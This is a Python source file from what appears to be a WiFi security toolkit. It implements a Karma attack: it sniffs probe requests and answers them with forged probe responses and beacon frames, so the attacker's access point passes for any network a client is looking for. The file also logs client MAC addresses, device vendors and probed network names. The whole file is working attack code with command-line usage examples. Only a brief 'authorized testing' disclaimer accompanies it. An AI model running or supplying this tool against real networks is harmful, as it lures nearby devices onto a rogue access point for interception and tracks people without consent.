#!/usr/bin/env python3
"""
Karma Attack for Hoover WiFi Security Toolkit
Responds to all WiFi probe requests with matching beacon frames,
making the attacker's AP appear to be any network clients are looking for
For authorized security testing and research only
"""

import argparse
import os
import random
import subprocess
import sys
import threading
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11ProbeReq,
    Dot11ProbeResp,
    RadioTap,
)
from scapy.sendrecv import sendp, sniff

from oui_lookup import lookup_vendor
from utils import check_monitor_mode, load_ssids, require_root, setup_logging, validate_interface

DEFAULT_BLACKLIST: list[str] = [
    "",
]


class KarmaAttack:
    def __init__(self, interface: str, channel: int = 6,
                 whitelist: Optional[list[str]] = None,
                 blacklist: Optional[list[str]] = None,
                 log_file: str = "captures/karma_probes.log",
                 bssid: Optional[str] = None) -> None:
        self.interface: str = interface
        self.channel: int = channel
        self.whitelist: Optional[list[str]] = whitelist
        self.blacklist: list[str] = blacklist if blacklist is not None else list(DEFAULT_BLACKLIST)
        self.log_file: str = log_file
        self.bssid: str = bssid or self._generate_bssid()
        self.logger = setup_logging("karma_attack")
        self.seen_probes: dict[str, set[str]] = {}
        self.responded_count: int = 0
        self._stop_event = threading.Event()

    @staticmethod
    def _generate_bssid() -> str:
        octets = [0x02] + [random.randint(0x00, 0xFF) for _ in range(5)]
        return ":".join(f"{b:02x}" for b in octets)

    def packet_handler(self, packet) -> None:
        if not packet.haslayer(Dot11ProbeReq):
            return

        try:
            client_mac = packet[Dot11].addr2
            if not client_mac:
                return
            client_mac = client_mac.upper()

            ssid = ""
            elt = packet.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0 and elt.info:
                    try:
                        ssid = elt.info.decode("utf-8", errors="replace")
                    except Exception:
                        pass
                    break
                elt = elt.payload.getlayer(Dot11Elt)

            if ssid in self.blacklist:
                return

            if self.whitelist is not None and ssid not in self.whitelist:
                return

            if not ssid:
                return

            if client_mac not in self.seen_probes:
                self.seen_probes[client_mac] = set()
            self.seen_probes[client_mac].add(ssid)

            vendor = lookup_vendor(client_mac)
            self.logger.info(
                "Probe: %s (%s) -> '%s'", client_mac, vendor, ssid
            )

            response = self._create_probe_response(ssid, client_mac)
            sendp(response, iface=self.interface, verbose=False)

            beacon = self._create_beacon(ssid)
            sendp(beacon, iface=self.interface, verbose=False)

            self.responded_count += 1
            self.logger.info("  Responded with beacon for '%s'", ssid)

        except Exception as e:
            self.logger.debug("Error handling probe: %s", e)

    def _create_probe_response(self, ssid: str, client_mac: str) -> object:
        dot11 = Dot11(
            type=0, subtype=5,
            addr1=client_mac, addr2=self.bssid, addr3=self.bssid,
        )
        probe_resp = Dot11ProbeResp(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        dsset = Dot11Elt(ID="DSset", info=chr(self.channel).encode())
        return RadioTap() / dot11 / probe_resp / essid / rates / dsset

    def _create_beacon(self, ssid: str) -> object:
        dot11 = Dot11(
            type=0, subtype=8,
            addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid, addr3=self.bssid,
        )
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        dsset = Dot11Elt(ID="DSset", info=chr(self.channel).encode())
        return RadioTap() / dot11 / beacon / essid / rates / dsset

    def _set_channel(self) -> None:
        try:
            if validate_interface(self.interface):
                subprocess.run(
                    ["iwconfig", self.interface, "channel", str(self.channel)],
                    capture_output=True, text=True, timeout=5,
                )
                self.logger.info("Set channel to %d", self.channel)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.warning("Could not set channel: %s", e)

    def start(self) -> None:
        self.logger.info("Starting Karma Attack on %s", self.interface)
        self.logger.info("  BSSID: %s", self.bssid)
        self.logger.info("  Channel: %d", self.channel)
        if self.whitelist:
            self.logger.info("  Whitelist: %s", ", ".join(self.whitelist))
        self.logger.info("  Press Ctrl+C to stop\n")

        self._set_channel()

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda p: self._stop_event.is_set(),
            )
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self) -> None:
        self._stop_event.set()
        self.print_summary()
        self.save_log()

    def print_summary(self) -> None:
        unique_clients = len(self.seen_probes)
        unique_ssids = set()
        for ssids in self.seen_probes.values():
            unique_ssids.update(ssids)

        print(f"\n{'='*60}")
        print("Karma Attack Summary")
        print(f"{'='*60}")
        print(f"Unique clients:    {unique_clients}")
        print(f"Unique SSIDs:      {len(unique_ssids)}")
        print(f"Responses sent:    {self.responded_count}")

        if self.seen_probes:
            print(f"\n{'Client MAC':<20} {'Vendor':<20} {'Probed SSIDs'}")
            print("-" * 60)
            for mac, ssids in sorted(self.seen_probes.items()):
                vendor = lookup_vendor(mac)
                ssid_list = ", ".join(sorted(ssids))
                print(f"{mac:<20} {vendor[:20]:<20} {ssid_list}")

    def save_log(self) -> None:
        if not self.seen_probes:
            return

        try:
            os.makedirs(os.path.dirname(self.log_file) or ".", exist_ok=True)
            with open(self.log_file, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n--- Karma Attack Log [{timestamp}] ---\n")
                f.write(f"BSSID: {self.bssid}\n")
                f.write(f"Responses: {self.responded_count}\n\n")
                for mac, ssids in sorted(self.seen_probes.items()):
                    vendor = lookup_vendor(mac)
                    f.write(f"{mac} ({vendor}): {', '.join(sorted(ssids))}\n")
            self.logger.info("Log saved to %s", self.log_file)
        except Exception as e:
            self.logger.error("Failed to save log: %s", e)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Karma Attack - Respond to all probe requests with matching beacons",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Respond to all probes
  sudo python3 karma_attack.py -i wlan0mon

  # Only respond to specific SSIDs
  sudo python3 karma_attack.py -i wlan0mon --whitelist ssids.txt

  # Custom BSSID and channel
  sudo python3 karma_attack.py -i wlan0mon --bssid 02:00:00:00:00:01 -ch 11

Note: Interface must be in monitor mode.
      For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode")
    parser.add_argument("-ch", "--channel", type=int, default=6,
                        help="Channel to operate on (default: 6)")
    parser.add_argument("--whitelist",
                        help="File with SSIDs to respond to (one per line)")
    parser.add_argument("--blacklist",
                        help="File with SSIDs to ignore (one per line)")
    parser.add_argument("-o", "--output", default="captures/karma_probes.log",
                        help="Log file (default: captures/karma_probes.log)")
    parser.add_argument("--bssid",
                        help="Custom BSSID to use (default: auto-generated)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    if not check_monitor_mode(args.interface):
        logger = setup_logging("karma_attack")
        logger.warning("%s may not be in monitor mode", args.interface)
        response = input("Continue anyway? (y/N): ")
        if response.lower() != "y":
            sys.exit(1)

    whitelist = None
    if args.whitelist:
        whitelist = load_ssids(args.whitelist)

    blacklist = None
    if args.blacklist:
        blacklist = load_ssids(args.blacklist) + DEFAULT_BLACKLIST

    attack = KarmaAttack(
        interface=args.interface,
        channel=args.channel,
        whitelist=whitelist,
        blacklist=blacklist,
        log_file=args.output,
        bssid=args.bssid,
    )

    attack.start()


if __name__ == "__main__":
    main()
